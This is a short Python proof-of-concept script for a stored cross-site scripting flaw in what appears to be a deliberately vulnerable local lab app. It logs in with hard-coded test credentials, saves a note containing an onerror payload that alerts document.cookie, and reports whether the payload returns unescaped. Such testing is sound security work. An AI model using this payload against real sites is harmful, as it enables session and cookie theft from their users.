import sys, requests

# Usage: python poc.py http://localhost/Obscura/vulnerable/app
base = sys.argv[1].rstrip('/')
s = requests.Session()
s.post(f"{base}/login.php", data={"username": "maria", "password": "Maria123!"})

# store a note whose content is a JavaScript payload
payload = '<img src=x onerror="alert(document.cookie)">'
r = s.post(f"{base}/note_edit.php", data={"title": "xss-poc", "content": payload})

# the note page is returned after the redirect; check if the script came back raw
if 'onerror="alert(document.cookie)"' in r.text:
    print("[+] VULNERABLE: stored XSS payload returned unescaped (script executes)")
else:
    print("[-] SAFE: payload was escaped / neutralised")